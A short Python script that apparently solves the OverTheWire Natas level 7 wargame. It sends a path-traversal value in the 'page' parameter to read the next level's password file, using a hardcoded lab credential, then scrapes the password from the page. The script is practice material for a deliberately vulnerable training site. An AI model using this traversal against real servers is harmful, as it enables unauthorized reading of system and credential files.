import requests
from bs4 import BeautifulSoup
url = "http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8"
r = requests.get(url, auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))

soup = BeautifulSoup(r.text, 'html.parser')
strings = soup.find('div', attrs={'id':'content'})
password = strings.text.split()[2]
print('The password for natas8 is',password)
